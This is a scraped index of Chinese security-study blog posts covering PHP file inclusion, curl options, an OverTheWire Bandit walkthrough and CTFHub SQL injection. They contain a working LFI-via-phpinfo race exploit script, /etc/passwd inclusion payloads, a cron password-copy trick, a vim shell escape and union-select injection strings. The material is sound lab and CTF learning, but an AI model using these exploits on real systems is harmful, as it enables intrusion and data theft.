","date":"2021-03-12","objectID":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","tags":["Web安全","CTF"],"title":"安全牛文件包含学习笔记","uri":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x03 session.upload_progress.enable session.upload_progress.enabled这个参数在php.ini 默认开启，需要手动置为Off，如果不是Off，就会在上传的过程中生成上传进度文件，它的存储路径可以在phpinfo获取到。/var/lib/php/sess_{your_php_session_id} session.upload_progress.enabled : 是否启用上传进度报告(默认开启) session.upload_progress.cleanup: 是否在上传完成后及时删除进度数据(默认开启),生成的文件会定时清空，不能写入恶意代码，这时候需要条件竞争。参考代码示例如下： #loop.py import os from multiprocessing.dummy import Pool as threadpool sessname=\"iamnotorange\" def runner(i): cmd=\"curl -s 127.0.0.1/oneline.php -H 'Cookie: PHPSESSID=%s' -F 'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking' -F 'file=@/etc/passwd' 1\u003e/dev/null\"%sessname os.system(cmd) os.system(\"xxd /var/lib/php/sessions/sess_%s \"%sessname) pool=threadpool(30) result=pool.map_async(runner,range(30)).get(0xffff) curl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思。参考自：https://www.ruanyifeng.com/blog/2019/09/curl-reference.html -A参数指定客户端的用户代理标头，即User-Agent。curl 的默认用户代理字符串是curl/[version] 范例：curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com -b参数用来向服务器发送Cookie。 范例1：curl -b 'foo=bar' https://google.com 范例2：curl -b 'foo1=bar;foo2=bar2' https://google.com 范例3：curl -b cookies.txt https://www.google.com -c参数将服务器设置的Cookie 写入一个文件。 范例：curl -c cookies.txt https://www.google.com -d参数用于发送POST请求的数据体。 范例1：curl -d'login=emma＆password=123'-X POST https://google.com/login 范例2：curl -d 'login=emma' -d 'password=123' -X POST https://google.com/login --data-urlencode参数等同于-d，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。 -e参数用来设置HTTP的标头Referer，表示请求的来源。 范例：curl -e 'https://google.com?q=example' https://www.example.com -F参数用来向服务器上传二进制文件。 范例1：curl -F 'file=@photo.png' https://google.com/profile 上面命令会给 HTTP 请求加上标头Content-Type: multipart/form-data，然后将文件photo.png作为file字段上传。 -F参数可以指定MIME类型。 范例2：curl -F 'file=@photo.png;type=image/png' https://google.com/profile 上面命令指定 MIME 类型为image/png，否则 curl 会把 MIME 类型设为application/octet-stream。 -F参数也可以指定文件名。 curl -F 'file=@photo.png;filename=me.png' https://google.com/profile 上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。 -G参数用来构造GET请求URL的查询字符串。 范例：curl -G -d 'q=kitties' -d 'count=20' https://google.com/search -H参数添加 HTTP 请求的标头。 范例1：curl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com 范例2：curl -d '{\"login\": \"emma\", \"pass\": \"123\"}' -H 'Content-Type: application/json' https://google.com/login 上面命令添加 HTTP 请求的标头是Content-Type: application/json，然后用-d参数发送 JSON 数据。 -i参数打印出服务器回应的 HTTP 标头。 范例：curl -i https://www.example.com -I参数向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。 -k参数指定跳过 SSL 检测。 -L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。 --limit-rate用来限制 HTTP 请求和回应的带宽，模拟慢网速的环境。 范例：curl --limit-rate 200k https://google.com -o参数将服务器的回应保存成文件，等同于wget命令。 范例：curl -o example.html https://www.example.com 上面命令将www.example.com保存成example.html。 -O参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。 范例：curl -O https://www.example.com/foo/bar.html 上面命令将服务器回应保存成文件，文件名为bar.html。 -s参数将不输出错误和进度信息。 如果想让 curl 不产生任何输出，可以使用curl -s -o /dev/null https://google.com -S参数指定只输出错误信息 -u参数用来设置服务器认证的用户名和密码。 范例1：curl -u 'bob:12345' https://google.com/login 上面命令设置用户名为bob，密码为12345，然后将其转为 HTTP 标头Authorization: Basic Ym9iOjEyMzQ1。 范例2： curl https://bob:12345@google.com/login 上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。 范例3： curl -u 'bob' https://google.com/login 上面命令只设置了用户名，执行后，curl 会提示用户输入密码。 -v参数输出通信的整个过程，用于调试。 --trace参数也可以用于调试，还会输出原始的二进制数据。 -x参数指定 HTTP 请求的代理。 范例1：curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com 上面命令指定 HTTP 请求通过myproxy.com:8080的 socks5 代理发出。 范例2：curl -x james:cats@myproxy.com:8080 https://www.example.com 如果没有指定代理协议，默认为 HTTP。 -X参数指定 HTTP 请求的方法。 ","date":"2021-03-12","objectID":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:0","tags":["Web安全","CTF"],"title":"安全牛文件包含学习笔记","uri":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x04 远古截断、利用phpinfo包含临时文件 phpinfo中open_basedir能够查看用户能够访问的路径。 %00截断(需要 magic_quotes_gpc=off，PHP小于5.3.4有效(?)) 范例：url/?page=phpinfo.txt%00 路径长度截断：./和.(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256) 范例： url/?page=phpinfo.txt.(n个.) 向服务器上任意php文件以form-data方式提交请求上传数据时，会生成临时文件,通过phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。 #!/usr/bin/env pyhon # -*-coding: utf-8 -*- \"\"\" php 处理脚本执行完后再删除临时文件，间隔时间极短 \"\"\" import sys import threading import socket import logging from argparse import ArgumentParser logging.basicConfig(level=logging.INFO) log = logging.getLogger(__name__) def setup(host, port): tag = \"Security Test\" boundary = '---------------------------11008921013555437861019615112'#分隔符 # # php_path maybe '/lfi_phpinfo' or '' php_path = '' payload = \"{tag}\\r\\n\".format(tag=tag) payload += '\u003c?php ?\u003e\\');?\u003e' req_data = '--{b}\\r\\n'.format(b=boundary) req_data += 'Content-Disposition: form-data; name=\"file\"; filename=\"file.txt\"\\r\\n' req_data += 'Content-Type: text/plain\\r\\n' req_data += '\\r\\n' req_data += '{payload}\\r\\n'.format(payload=payload) req_data += '--{b}--'.format(b=boundary) # padding for delay php server delete tmp file # 这种方式是phpinfo返回发送的头信息，信息过大的话就采用分块传输，padding增加了传输时间,根据需要改 padding = 'A' * 8000 req = 'POST {path}/phpinfo.php?a={padding} HTTP/1.1\\r\\n'.format(path=php_path, padding=padding) req += 'Host: {host}\\r\\n'.format(host=host) req += 'Cookie: othercookie={padding}\\r\\n'.format(padding=padding) req += 'User-Agent: {padding}\\r\\n'.format(padding=padding) #req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n' req += 'Accept: {padding}\\r\\n'.format(padding=padding) req += 'Accept-Language: {padding}\\r\\n'.format(padding=padding) req += 'Accept-Encoding: {padding}\\r\\n'.format(padding=padding) req += 'Content-Type: multipart/form-data; boundary={b}\\r\\n'.format(b=boundary) req += 'Content-Length: {l}\\r\\n'.format(l=len(req_data)) req += 'Connection: close\\r\\n' req += '\\r\\n' req += '{data}'.format(data=req_data) # modify this to suit the LFI script lfi_req = 'GET {path}/lfi.php?load=%s HTTP/1.1\\r\\n'.format(path=php_path) lfi_req += 'Connection: Keep-alive\\r\\n' lfi_req += 'Host: %s\\r\\n' lfi_req += '\\r\\n' return (req, tag, lfi_req) def lfi_phpinfo(host, port, phpinfo_req, offset, lfi_req, tag): s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s1.connect((host, port)) s2.connect((host, port)) s1.sendall(phpinfo_req) data = \"\" while len(data) \u003c offset: data += s1.recv(offset) try: index = data.index(\"[tmp_name] =\u003e\") fn = data[index+17: index+31] except ValueError as e: err_msg = \"fetch temp file path error: {e}\".format(e=e) log.error(err_msg) return None s2.sendall(lfi_req % (fn, host)) data = s2.recv(4096) # debug log.debug(data) s1.close() s2.close() if data.find(tag) != -1: return fn counter = 0 class ThreadWorker(threading.Thread): def __init__(self, event, lock, maxattempts, *args): threading.Thread.__init__(self) self.event = event self.lock = lock self.maxattempts = maxattempts self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter \u003e= self.maxattempts: return counter += 1 try: x = lfi_phpinfo(*self.args) if self.event.is_set(): break if x: info_msg = \"\\nGot it! Shell created in /tmp/g\" log.info(info_msg) self.event.set() except socket.error: return def getoffset(host, port, phpinfo_req): \"\"\"Gets offset of tmp_name in php output \"\"\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.sendall(phpinfo_req) data = \"\" while True: rcv_data = s.recv(4096) data += rcv_data if rcv_data == \"\": break # detect the final chunk if rcv_data.endswith(\"0\\r\\n\\r\\n\"): break s.close() # debug #log.debug(data) index = data.find(\"[tmp_name] =\u003e\") if index == -1: raise ValueError(\"No php tmp_name in phpinfo output\") info_msg = \"found {file} at {index}\".format(file=data[index:index+10], index=index) log.info(info_msg) # padded up a bit return index+256 def main(): banner =","date":"2021-03-12","objectID":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:0","tags":["Web安全","CTF"],"title":"安全牛文件包含学习笔记","uri":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x05 自包含、php7SegmentFault /a.php?include=a.php 这样a.php会将它本身包含进来，而被包含进来的a.php再次尝试处理url的包含请求时，再次将自己包含进来，形成了无穷递归，递归会导致爆栈，使php无法进行此次请求的后续处理，然后就能进行包含啦！ 本地文件包含漏洞可以让 php 包含自身从而导致死循环,然后 php 就会崩溃 ，如果请求中同时存在一个上传文件的请求的话 , 这个文件就会被保留，include.php?file=php://filter/string.strip_tags/resource=/etc/passwd 参考：https://www.jianshu.com/p/dfd049924258 ","date":"2021-03-12","objectID":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:0","tags":["Web安全","CTF"],"title":"安全牛文件包含学习笔记","uri":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习"],"content":"\rhttps://overthewire.org/wargames/是一个学习linux命令的WarGame，通过闯关的模式，不断的学习新的命令，对于学习安全和Linux的朋友是一个很好的练习游戏。\r","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:0:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x00 Level0 用MobaXterm设置ssh连接 输入bandit0密码登录 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:1:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x01 level0-\u003elevel1 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:2:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x02 level1-\u003e level2 修改用户名为后，重新连接ssh，密码为boJ9jbbUNNfktd78OOpsqOltutMc3MY1。 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:3:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x03 level2-\u003e level3 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:4:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x04 level3-\u003e level4 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:5:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x05 level4-\u003e level5 file命令可以用于辨识文件类型 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:6:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x06 level5-\u003elevel6 Linux find 命令用来在指定目录下查找文件。 Usage: find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path…] [expression]\r一些参数说明 -mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件\r-amin n : 在过去 n 分钟内被读取过\r-anewer file : 比文件 file 更晚被读取过的文件\r-atime n : 在过去n天内被读取过的文件\r-cmin n : 在过去 n 分钟内被修改过\r-cnewer file :比文件 file 更新的文件\r-ctime n : 在过去n天内被修改过的文件\r-empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name\r-ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写\r-name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写\r-size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。\r-type c : 文件类型是 c 的文件。\rd: 目录\rc: 字型装置文件\rb: 区块装置文件\rp: 具名贮列\rf: 一般文件\rl: 符号连结\rs: socket\r-pid n : process id 是 n 的文件\r","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:7:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x07 level6-\u003elevel7 后查阅资料发现，报错可用2\u003e/dev/null隐藏。Linux系统预留可三个文件描述符：0——标准输入（stdin）、1——标准输出（stdout）和2标准错误（stderr）。\u003e是重定向。/dev/null是一个特殊的设备文件，这个文件接收到任何数据都会被丢弃。这个设备通常也被称为位桶（bit bucket）或黑洞。 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:8:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x08 level7-\u003elevel8 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:9:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x09 level8-\u003elevel9 uniq参数 -c或--count 在每列旁边显示该行重复出现的次数。\r-d或--repeated 仅显示重复出现的行列。\r-f\u003c栏位\u003e或--skip-fields=\u003c栏位\u003e 忽略比较指定的栏位。\r-s\u003c字符位置\u003e或--skip-chars=\u003c字符位置\u003e 忽略比较指定的字符。\r-u或--unique 仅显示出一次的行列。\r-w\u003c字符位置\u003e或--check-chars=\u003c字符位置\u003e 指定要比较的字符。\r--help 显示帮助。\r--version 显示版本信息。\r","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:10:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x0A level9-\u003elevel10 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:11:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x0B level10-\u003elevel11 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:12:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x0C level11-\u003elevel12 ROT13加密 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:13:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x0D level12-\u003elevel13 xxd [options] [infile [outfile]] xxd -r[evert] [options] [infile [outfile]] xxd 命令用于用二进制或十六进制显示文件的内容，如果没有指定outfile参数，则把结果显示在屏幕上，如果指定了outfile则把结果输出到 outfile中；如果infile参数为 – 或则没有指定infile参数，则默认从标准输入读入。 -r 逆向操作: 把xxd的十六进制输出内容转换回原文件的二进制内容。 发现文件是gzip格式，mv为.gz文件后，gzip -d解压缩。 发现文件是bzip2格式，mv为.bz2文件后，bzip2 -d解压缩。 接着是嵌套的解压缩 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:14:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x0E level13-\u003elevel14 发现存在ssh的私钥文件。 usage: ssh [-1246AaCfGgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec]\r[-D [bind_address:]port] [-E log_file] [-e escape_char]\r[-F configfile] [-I pkcs11] [-i identity_file]\r[-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec]\r[-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address]\r[-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]\r[user@]hostname [command]\r","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:15:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x0F level14-\u003elevel15 Usage: telnet [-4] [-6] [-8] [-E] [-L] [-a] [-d] [-e char] [-l user]\r[-n tracefile] [ -b addr ] [-r] [host-name [port]]\r","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:16:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x10 level15-\u003elevel16 s_client为一个SSL/TLS客户端程序，与s_server对应，它不仅能与s_server进行通信，也能与任何使用ssl协议的其他服务程序进行通信。使用命令openssl s_client远程连接。 -connect host:port - who to connect to (default is localhost:4433)\r","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:17:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x11 level16-\u003elevel17 使用nmap -sV localhost -p 31000-32000，-sV 显示详情，-p指定端口。 发现两个可疑目标，开始测试ssl连接。得到一段ssh私钥文件。 提示权限问题 修改权限后再次连接，chmod 600 ssh.priv， ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:18:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x12 level17-\u003elevel18 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:19:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x13 level18-\u003elevel19 无法直接使用密码登录。可以用命令直接读取文件。也可以使用ssh bandit18@localhost -T禁用伪终端方式登录。 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:20:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x14 level19-\u003elevel20 id命令用于显示用户的ID，以及所属群组的ID。 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:21:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x15 level20-\u003elevel21 nc是netcat的简写，可以用来取代telnet进行某些服务端口的检测工作。 服务端：nc -l 端口号 \u003e 文件名 客户端：nc 主机的ip或域名 端口号 \u003c 文件名 常用参数：\r-l：用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server\r-s：指定发送数据的源IP地址，适用于多网卡机\r-u：指定nc使用UDP协议，默认为TCP\r-v：输出交互或出错信息，新手调试时尤为有用\r-w：超时秒数，后面跟数字\r-z：表示zero，表示扫描时不发送任何数据\r使用 \u0026 号将下面这个命令放到后台运行 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:22:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x16 level21-\u003elevel22 在LINUX中，周期执行的任务一般由cron这个守护进程来处理。cron读取一个或多个配置文件，这些配置文件中包含了命令行及其调用时间。cron的配置文件称为“crontab”，是“cron table”的简写。 在crontab文件中如何输入需要执行的命令和时间。该文件中每行都包括六个域，其中前五个域是指定命令被执行的时间，最后一个域是要被执行的命令。每个域之间使用空格或者制表符分隔。格式如下： minute hour day-of-month month-of-year day-of-week commands\u0026nbsp; 合法值 00-59 00-23 01-31 01-12 0-6 (0 is sunday) 除了数字还有几个个特殊的符号就是\"*\"、\"/“和”-\"、\",\"，*代表所有的取值范围内的数字，\"/“代表每的意思,\"/5\"表示每5个单位，”-“代表从某个数字到某个数字,”,“分开几个离散的数字。 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:23:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x17 level22-\u003elevel23 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:24:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x18 level23-\u003elevel24 stat命令主要用于显示文件或文件系统的详细信息。 语法：stat [option] file option参数说明： -L, --dereference 显示符号链接 -f, --file-system 显示文件系统状态而不是文件状态\r-c --format=FORMAT 自定义输出格式，结尾有换行 --printf=FORMAT\r如同 --format, 但是解释反斜杠转义，而不是\r输出强制性的换行符; 如果你想换行，\r在FORMAT中包含\\n\r-t, --terse 以简洁的形式打印信息\r--显示此帮助并退出\r--version 输出版本信息并退出\r其中format可以自定义个数数组的有： %a 八进制表示的访问权限\r%A 可读格式表示的访问权限\r%b 分配的块数（参见 %B）\r%B %b 参数显示的每个块的字节数\r%d 十进制表示的设备号\r%D 十六进制表示的设备号\r%f 十六进制表示的 Raw 模式\r%F 文件类型\r%g 属主的组 ID\r%G 属主的组名\r%h 硬连接数\r%i Inode 号\r%n 文件名\r%N 如果是符号链接，显示器所链接的文件名\r%o I/O 块大小\r%s 全部占用的字节大小\r%t 十六进制的主设备号\r%T 十六进制的副设备号\r%u 属主的用户 ID\r%U 属主的用户名\r%x 最后访问时间\r%X 最后访问时间，自 Epoch 开始的秒数\r%y 最后修改时间\r%Y 最后修改时间，自 Epoch 开始的秒数\r%z 最后改变时间\r%Z 最后改变时间，自 Epoch 开始的秒数\r针对文件系统还有如下格式选项：\r%a 普通用户可用的块数\r%b 文件系统的全部数据块数\r%c 文件系统的全部文件节点数\r%d 文件系统的可用文件节点数\r%f 文件系统的可用节点数\r%C SELinux 的安全上下文\r%i 十六进制表示的文件系统 ID\r%l 文件名的最大长度\r%n 文件系统的文件名\r%s 块大小（用于更快的传输）\r%S 基本块大小（用于块计数）\r%t 十六进制表示的文件系统类型\r%T 可读格式表示的文件系统类型\r这里参考了大佬的博客，/var/spool/cron/ 这个目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，一般一个用户最多只有一个crontab文件。在/var/spool/bandit24目录下就可以运行bandit24的定时任务。 创建脚本，写入cat /etc/bandit_pass/bandit24 \u003e /tmp/bandit24pass ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:25:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x19 level24-\u003elevel25 做出字典，然后执行nc localhost 30002 \u003c 1.txt for i in {1000..9999}\rdo\recho \"UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i \" \u003e\u003e 1.txt\rdone\r","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:26:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x1A level25-\u003elevel26 发现存在密钥，执行ssh -i bandit26.sshkey bandit26@localhost，返回失败。 账号名称：即登陆时的用户名 密码：早期UNIX系统的密码是放在这个文件中的，但因为这个文件的特性是所有程序都能够读取，所以，这样很容易造成数据被窃取，因此后来就将这个字段的密码数据改放到/etc/shadow中了 UID：用户ID，每个账号名称对应一个UID，通常UID=0表示root管理员 GID：组ID，与/etc/group有关，/etc/group与/etc/passwd差不多，是用来规范用户组信息的 用户信息说明栏： 用来解释这个账号是干什么的 家目录：home目录，即用户登陆以后跳转到的目录，以root用户为例，/root是它的家目录，所以root用户登陆以后就跳转到/root目录这里 Shell：用户使用的shell，通常使用/bin/bash这个shell，这也就是为什么登陆Linux时默认的shell是bash的原因，就是在这里设置的，如果要想更改登陆后使用的shell，可以在这里修改。另外一个很重要的东西是有一个shell可以用来替代让账号无法登陆的命令，那就是/sbin/nologin。 将终端对话框缩放小，这样可以自动执行more 在exit 0前，按v进入vim编辑模式，通过:e file，可以导入文件到编辑器内，执行 :e /etc/bandit_pass/bandit26\r","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:27:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x1B level26-\u003elevel27 将终端对话框缩放小，以bandit26登录 vim模式下\r:set shell=/bin/sh\r:sh\r","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:28:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x1C level27-\u003elevel28 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:29:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x1D level28-\u003elevel29 git clone后查看文件 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:30:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x1E level29-\u003elevel30 git branch -a查看分支，一般dev是development开发者的分支，git checkout切换分支 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:31:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x1F level30-\u003elevel31 git show-ref显示本地存储库中可用的引用以及关联的提交ID。 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:32:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x20 level31-\u003elevel32 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:33:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x21 level32-\u003elevel33 linux shell下的特殊用法及参数的说明： $$ Shell本身的PID（ProcessID）\r$! Shell最后运行的后台Process的PID\r$? 最后运行的命令的结束代码（返回值）\r$- 使用Set命令设定的Flag一览\r$* 所有参数列表。如\"$*\"用「\"」括起来的情况、以\"$1 $2 … $n\"的形式输出所有参数。\r$@ 所有参数列表。如\"$@\"用「\"」括起来的情况、以\"$1\" \"$2\" … \"$n\" 的形式输出所有参数。\r$# 添加到Shell的参数个数\r$0 Shell本身的文件名\r$1～$n 添加到Shell的各参数值。$1是第1参数、$2是第2参数…。\r","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:34:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习"],"content":"0x22 level33-\u003elevel34 ","date":"2021-03-08","objectID":"/2021-03-08-overthewirebandit/:35:0","tags":["Linux"],"title":"OverTheWire:Bandit","uri":"/2021-03-08-overthewirebandit/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-03-05","objectID":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/:0:0","tags":["Web安全","CTF"],"title":"CTFHub-SQL注入学习","uri":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x00 前言 菜鸡记录汇总下SQL注入的学习过程。 ","date":"2021-03-05","objectID":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/:1:0","tags":["Web安全","CTF"],"title":"CTFHub-SQL注入学习","uri":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x01 整数型注入 很明显地发现id是注入点。 使用order by 子句快速猜解表中的列数，试出列数为2。 配合union select语句进行回显，输入-1 union select 1,database()#，爆破数据库 输入-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#，爆破表 输入-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag')#，爆破字段 